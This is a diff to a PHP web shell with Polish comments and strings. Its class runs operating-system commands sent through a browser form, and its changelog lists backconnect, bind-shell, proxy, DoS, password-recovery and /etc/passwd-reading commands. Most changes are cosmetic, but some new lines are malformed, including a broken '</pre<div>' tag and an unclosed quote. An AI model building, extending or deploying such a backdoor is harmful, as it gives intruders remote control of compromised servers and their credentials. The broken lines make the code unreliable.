@@ -176,6 +176,7 @@ class Shell
 		if( ( $sDisableFunctions = ini_get( 'disable_functions' ) ) !== '' )
 		{
 			$aDisableFunctions = explode( ',', $sDisableFunctions );
+
 			array_walk( $aDisableFunctions, create_function( '$sValue', 'return strtolower( trim( $sValue ) );' ) );
 
 			$this -> aDisableFunctions = $aDisableFunctions;
@@ -200,7 +201,6 @@ class Shell
 			if( isset( $_GET['f'] ) )
 			{
 				unlink( $sFilePath );
-
 			}
 			else
 			{
@@ -336,10 +336,13 @@ DATA;
 		}
 
 		/**
-		 * Wersje
+		 * Wyswietlanie wersji bibliotek
 		 */
 		if( ( $this -> iArgc === 1 ) && ( $this -> aArgv[0] === 'version' ) )
 		{
+			/**
+			 * Szukanie najdluzszej nazwy modulu
+			 */
 			$iMaxLen = 0;
 			foreach( $this -> aHelpModules as $sModule => $sModuleCmd )
 			{
@@ -349,6 +352,9 @@ DATA;
 				}
 			}
 
+			/**
+			 * Wersja modulu
+			 */
 			$sOutput = NULL;
 			foreach( $this -> aHelpModules as $sModule => $sModuleCmd )
 			{
@@ -418,11 +424,11 @@ DATA;
 	private function getCommandCr3d1ts()
 	{
 		return <<<DATA
-Jak to się mówi: <strong>&#069;&#097;&#115;&#116;&#101;&#114;&#032;&#101;&#103;&#103;</strong>
+Jak to się mówi: '&#069;&#097;&#115;&#116;&#101;&#114;&#032;&#101;&#103;&#103;'
 
 Domyślnie tego polecenia nie ma, ale udało Ci się je znaleźć.
 
-Jakieś sugestie, pytania ? Pisz śmiało: <strong>Krzychu</strong> - <a href="m&#97;&#x69;&#108;&#x74;&#111;:&#x6B;&#x72;&#x7A;o&#116;&#x72;&#64;&#103;&#109;&#97;&#105;&#x6C;&#46;c&#x6F;&#x6D;">&#x6B;&#x72;&#x7A;o&#116;&#x72;&#64;&#103;&#109;&#97;&#105;&#x6C;&#46;c&#x6F;&#x6D;</a>
+Jakieś sugestie, pytania ? Pisz śmiało: Krzychu - <a href="m&#97;&#x69;&#108;&#x74;&#111;:&#x6B;&#x72;&#x7A;o&#116;&#x72;&#64;&#103;&#109;&#97;&#105;&#x6C;&#46;c&#x6F;&#x6D;">&#x6B;&#x72;&#x7A;o&#116;&#x72;&#64;&#103;&#109;&#97;&#105;&#x6C;&#46;c&#x6F;&#x6D;</a>
 
 Changelog:
 ==========
@@ -431,41 +437,41 @@ Changelog:
 ----------
 * Wsparcie dla CLI
 * Shella rozszerzono o następujące komendy:
-	<strong>ping</strong>
-	<strong>mkdir</strong>
-	<strong>cp</strong>
-	<strong>mv</strong>
-	<strong>modules</strong>
-	<strong>chmod</strong>
-	<strong>mysql</strong>
-	<strong>mysqldump</strong>
-	<strong>backconnect</strong>
-	<strong>bind</strong>
-	<strong>proxy</strong>
-	<strong>dos</strong>
-	<strong>passwordrecovery</strong>
-	<strong>cr3d1ts</strong>
+	ping
+	mkdir
+	cp
+	mv
+	modules
+	chmod
+	mysql
+	mysqldump
+	backconnect
+	bind
+	proxy
+	dos
+	passwordrecovery
+	cr3d1ts
 * możliwość wczytania danego modułu
-* polecenie <strong>cr3d1ts</strong> nie wyświetla się w help'ie (&#069;&#097;&#115;&#116;&#101;&#114;&#032;&#101;&#103;&#103;)
-* <strong>php</strong> jest aliasem dla <strong>eval</strong>
+* polecenie 'cr3d1ts' nie wyświetla się w help'ie (&#069;&#097;&#115;&#116;&#101;&#114;&#032;&#101;&#103;&#103;)
+* 'php' jest aliasem dla 'eval
 
 2011-05-15 v0.1
 ---------------
 * Pierwsza wersja skryptu, zawiera podstawowe komendy takie jak:
-	<strong>echo</strong>
-	<strong>ls</strong>
-	<strong>cat</strong>
-	<strong>eval</strong>
-	<strong>remove</strong>
-	<strong>bcat</strong>
-	<strong>socketdownload</strong>
-	<strong>ftpdownload</strong>
-	<strong>download</strong>
-	<strong>socketupload</strong>
-	<strong>ftpupload</strong>
-	<strong>etcpasswd</strong>
-	<strong>game</strong>
-	<strong>help</strong>
+	echo
+	ls
+	cat
+	eval
+	remove
+	bcat
+	socketdownload
+	ftpdownload
+	download
+	socketupload
+	ftpupload
+	etcpasswd
+	game
+	help
 DATA;
 	}
 
@@ -487,7 +493,7 @@ DATA;
 		}
 
 		/**
-		 * Wyswietlanie naglowka
+		 * Szukanie najdluzszego ciagu
 		 */
 		$sOutput = NULL;
 		foreach( $this -> aHelpModules as $sModule => $sModuleCmd )
@@ -635,7 +641,7 @@ DATA;
 		}
 		elseif( $sCmd === '' )
 		{
-			$sConsole = 'Wpisz <strong>:help</strong> by zobaczyć pomoc';
+			$sConsole = 'Wpisz ":help", by zobaczyć pomoc';
 		}
 		/**
 		 * Wykonanie komendy systemowej
@@ -669,7 +675,7 @@ DATA;
 			}
 			else
 			{
-				echo 'Nic sobie nie porobisz, wszystkie funkcje systemowe są poblokowane !!!';
+				echo 'Wszystkie funkcje systemowe są poblokowane !!!';
 			}
 
 			$sData = ob_get_contents();
@@ -679,7 +685,7 @@ DATA;
 		}
 		else
 		{
-			$sConsole = 'Safe mode jest włączone, więc <strong>exec</strong>, <strong>shell_exec</strong>, <strong>passthru</strong>, <strong>system</strong> i <strong>fopen</strong> nie zadziałają';
+			$sConsole = 'Safe mode jest włączone, funkcje systemowe nie działają !!!';
 		}
 
 		if( $bRaw || ( PHP_SAPI === 'cli' ) )
@@ -687,15 +693,10 @@ DATA;
 			return strip_tags( $sConsole );
 		}
 
-		$sContent  = sprintf( '<pre id="console">%s</pre>', $sConsole );
-		$sContent .= '<div>';
-		$sContent .= sprintf( '<form action="%s" method="post">', Request::getCurrentUrl() );
-		$sContent .= sprintf( '<input type="text" name="cmd" value="%s" size="110" id="cmd" />',
-			( ( ( $sVal = Request::getPost( 'cmd' ) ) !== FALSE ) ? $sVal : $sCmd )
-		);
-		$sContent .= '<input type="submit" name="submit" value="Execute" id="cmd-send" />';
-		$sContent .= '</form>';
-		$sContent .= '</div>';
+		$sContent  = sprintf( '<pre id="console">%s</pre<div>', $sConsole ) .
+		             sprintf( '<form action="%s" method="post">', Request::getCurrentUrl() ) .
+		             sprintf( '<input type="text" name="cmd" value="%s" size="110" id="cmd" />', ( ( ( $sVal = Request::getPost( 'cmd' ) ) !== FALSE ) ? $sVal : $sCmd ) ) .
+			     '<input type="submit" name="submit" value="Execute" id="cmd-send" /></form></div>';
 
 		return $this -> getContent( $sContent );
 	}
@@ -716,33 +717,34 @@ DATA;
 		$sVersion = self::VERSION;
 return <<<DATA
 <!DOCTYPE HTML><html><head><title>{$sTitle}</title><meta charset="utf-8"><style>
-body{background-color:#eef7fb;color:#000;font-size:12px;font-family:sans-serif, Verdana, Tahoma, Arial;margin:10px;padding:0;}
+body{background-color:#eff;color:#000;font-size:12px;font-family:sans-serif,Verdana,Tahoma,Arial;margin:10px;padding:0;}
 a{color:#226c90;text-decoration:none;}
 a:hover{color:#5a9cbb;text-decoration:underline;}
-h1,h2,h3,h4,h5,h6{margin-top:10px;padding-bottom:5px;color:#054463;border-bottom:1px solid #d0d0d0;}
-table{background-color:#fff;border:1px solid #e2ecf2;border-radius:20px;-moz-border-radius:20px;margin:auto;padding:6px;}
+h1,h2,h3,h4,h5,h6{margin-top:10px;padding-bottom:5px;color:#046;border-bottom:1px solid #ddd;}
+table{background-color:#fff;border:1px solid #eef;border-radius:20px;-moz-border-radius:20px;margin:auto;padding:6px;}
 td{background-color:#f8f8f8;border-radius:5px;-moz-border-radius:5px;margin:0;padding:0 0 0 4px;}
-th{color:#054463;font-size:14px;font-weight:700;background-color:#f2f2f2;border-radius:5px;-moz-border-radius:5px;margin:0;padding:2px;}
-hr{margin-top:20px;background-color:#eef7fb;border:1px solid #eef7fb;}
-div#body{text-align:center;border:3px solid #e2ecf2;border-radius:20px;-moz-border-radius:20px;min-width:940px;background-color:#fff;margin:0 auto;padding:8px 20px 10px;}
+th{color:#046;font-size:14px;font-weight:700;background-color:#f2f2f2;border-radius:5px;-moz-border-radius:5px;margin:0;padding:2px;}
+hr{margin-top:20px;background-color:#eff;border:1px solid #eef7fb;}
+div#body{text-align:center;border:3px solid #eef;border-radius:20px;-moz-border-radius:20px;min-width:940px;background-color:#fff;margin:0 auto;padding:8px 20px 10px;}
 div#menu{text-align:left;margin:0 auto;}
 div#bottom{margin:10px auto;}
 div#content{padding-top:10px;margin:0 auto;}
-pre#console{text-align:left;height:350px;min-height:350px;width:98%;font-size:11px;background-color:#f9f9f9;color:#000;border:3px solid #e2ecf2;overflow:scroll;margin:0 auto;padding:2px;}
+pre#console{text-align:left;height:350px;min-height:350px;width:98%;font-size:11px;background-color:#f9f9f9;color:#000;border:3px solid #def;overflow:scroll;margin:0 auto;padding:14px;}
 input{border-radius:10px;-moz-border-radius:10px;border:1px solid #aaa;background-color:#fff;font-size:14px;padding:6px;}
+input:hover{background-color:#eee;}
 input#cmd{width:88%;margin-top:10px;padding-left:10px;}
-input#cmd:hover{background-color:#f1f1f1;}
 input#cmd-send{margin-top:10px;margin-left:20px;}
 .green{color:#55b855;font-weight:700;}
-.red{color:#fb5555;font-weight:700;}</style>
+.red{color:#fb5555;font-weight:700;}
+</style>
 </head>
 <body>
-</body>
 <div id="body">
 <div id="menu">{$sMenu}</div>
 <div id="content">{$sData}</div>
 <div id="bottom">Strona wygenerowana w: <strong>{$sGeneratedIn}</strong> s | Wersja: <strong>{$sVersion}</strong></div>
 </div>
+</body>
 </html>
 DATA;
 	}
@@ -755,10 +757,10 @@ DATA;
 	 */
 	public function get()
 	{
-		$sData = $this -> getActionBrowser();
-
-		echo $sData;
-
+		/**
+		 * @todo - Tutaj ma byc edycja pliku
+		 */
+		echo $this -> getActionBrowser();
 	}
 
 	/**
